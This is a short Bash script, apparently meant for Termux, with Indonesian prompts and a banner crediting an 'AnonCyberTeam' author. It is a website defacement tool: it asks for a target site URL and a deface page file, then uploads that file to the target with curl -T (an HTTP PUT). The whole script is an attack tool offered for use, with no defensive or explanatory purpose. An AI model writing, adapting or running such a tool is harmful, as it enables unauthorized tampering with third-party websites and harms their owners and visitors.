#!bin/bash
#Hapus Copyright? Lu Bukan Coder Bro!
#masuktools

clear

figlet WebDay777
echo " _________________________________________
{ Author  : CodayID   | AnonCyberTeam     }
{ Contact : @hiidayt  | TEH Squad Cyber   }
{ GitHub  : codayid   | Security Darknet  }
{_____________________|___________________}"
read -p "{ Masukan Target Web  | " target;  
read -p "{ Masukan SC Deface   | " sc;                                     
echo "{_______WAIT__________"
curl -T /data/data/com.termux/files/home/webDay/$sc $target
